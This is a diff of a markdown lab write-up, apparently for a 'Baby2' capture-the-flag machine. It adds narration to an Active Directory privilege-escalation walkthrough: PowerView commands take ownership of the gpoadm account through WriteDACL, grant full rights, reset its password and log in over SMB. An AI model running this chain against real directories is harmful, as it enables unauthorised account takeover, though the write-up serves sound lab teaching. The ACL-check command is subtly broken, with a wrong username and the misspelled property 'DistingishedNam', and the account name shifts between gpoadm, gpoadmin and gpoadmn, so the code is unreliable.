@@ -183,6 +183,8 @@ Meanwhile, we had already set up a `Python HTTP server` to host `notpad.ps1` (a 
 ## Privilege Escalation
 Back in BloodHound, we discovered that `AMELIA.GRIFFITHS` is a member of the `LEGACY@BABY2.VL` group. According to the analysis, members of this group have the `WriteDACL` permission on the user `GPOADM@BABY2.VL`.
 
+![alt text](/assets/screenshots/baby2/10.png)
+
 ### writeDACL
 >In Active Directory, every object (like a user, group, or computer) has a set of permissions that control who can do what to it. These permissions are stored in something called a DACL (Discretionary Access Control List). The WriteDACL permission means you can edit that list of permissions.
 {: .prompt-tip }
@@ -193,30 +195,31 @@ Back in BloodHound, we discovered that `AMELIA.GRIFFITHS` is a member of the `LE
 >In Active Directory terms, If you have `WriteDACL` over a user account like `GPOADM`, you can add your own account and give it full control over `GPOADM`. From there, you can do things like: Reset their password Or even impersonate them completely.
 {: .prompt-tip }
 
+Now that we know `Amelia.Griffiths` has `WriteDACL` permissions over the `gpoadm` user, we can abuse this access using a tool called `PowerView`.
 
-![alt text](/assets/screenshots/baby2/10.png)
+We start by uploading PowerView.ps1 to the target machine and loading it into our session.
 
 ```powershell
 Import-Module .\PowerView.ps1
 ```
 
+We take ownership of the `gpoadm` user object.
 ```powershell
 Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
 ```
 
-Confirm
+Check that the owner is now `Amelia.Griffiths`:
 
 ```powershell
 Get-ADUser gpoadmin | ForEach-Object {Get-ACL "AD:\$($_.DistingishedNam)" | Select-Object -ExpandProperty Owner}
 ```
 
-All ACL
-
+After making `Amelia.Griffths` as the owner of `gpoadmn`, Give `Amelia.Griffiths` full rights over the `gpoadm` object so as we can Change the password of `gpoadmn`.
 ```powershell
 Add-DomainObjectAcl -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All
 ```
 
-Change Password
+Now that we have full control, we can change gpoadm’s password.
 
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
@@ -226,7 +229,7 @@ $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'gpoadm' -AccountPassword $NewPassword
 ```
 
-Finally
+Finally, we use the new password to authenticate as `gpoadm`.
 
 ```powershell
 nxc smb 10.10.70.158 -u gpoadm -p 'Password1234'
